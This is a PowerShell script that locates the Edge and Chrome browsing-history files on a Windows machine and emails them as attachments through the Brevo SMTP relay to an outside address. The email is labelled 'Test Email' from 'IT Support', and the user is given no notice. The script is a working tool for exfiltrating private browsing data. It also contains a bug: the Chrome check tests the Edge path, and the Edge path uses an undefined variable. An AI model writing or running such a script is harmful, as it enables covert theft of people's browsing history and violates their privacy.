# Define email parameters, I am using Brevo service to send email, please make sure you change settings according to your needs
# This script assumes Brevo is already configured correctly and allows sending emails from specific email addresses, also that the relevant SPF record changes have been configured to allow Brevo sending emails using your chosen domain
$smtpServer = "smtp-relay.brevo.com"
$smtpPort = 587
$smtpUsername = "IT Support"
$smtpPassword = "your_password"
$fromAddress = "sender@example.com"   # Sender address needs to match an approved email address set within Brevo to avoid emails being blocked or sent to junk/quarantine
$toAddress = "recipient@example.com"
$subject = "Test Email"
$body = "This is a test email sent from PowerShell."

# Define file paths for attachments
$attachment1 = "$Env:systemdrive\Users\$UserName\AppData\Local\Microsoft\Edge\User Data\Default\History"  # Path to Edge "History" file
$attachment2 = "$Env:SystemDrive\Users\$Env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\History" # Path to Chrome "History" file

# Create a new email message
$email = New-Object System.Net.Mail.MailMessage
$email.From = $fromAddress
$email.To.Add($toAddress)
$email.Subject = $subject
$email.Body = $body

# Attach files if they exist
if (-not (Test-Path -Path $attachment1)) {
    Write-Verbose "[!] Could not find Edge History file for username: $Env:USERNAME"
} else {
    $email.Attachments.Add($attachment1)
}

if (-not (Test-Path -Path $attachment1)) {
    Write-Verbose "[!] Could not find Chrome History file for username: $Env:USERNAME"
} else {
    $email.Attachments.Add($attachment2)
}

# Create SMTP client
$smtpClient = New-Object System.Net.Mail.SmtpClient
$smtpClient.Host = $smtpServer
$smtpClient.Port = $smtpPort
$smtpClient.Credentials = New-Object System.Net.NetworkCredential($smtpUsername, $smtpPassword)
$smtpClient.EnableSsl = $true

# Send email
$smtpClient.Send($email)

# Print a success message
Write-Host "Email sent successfully!"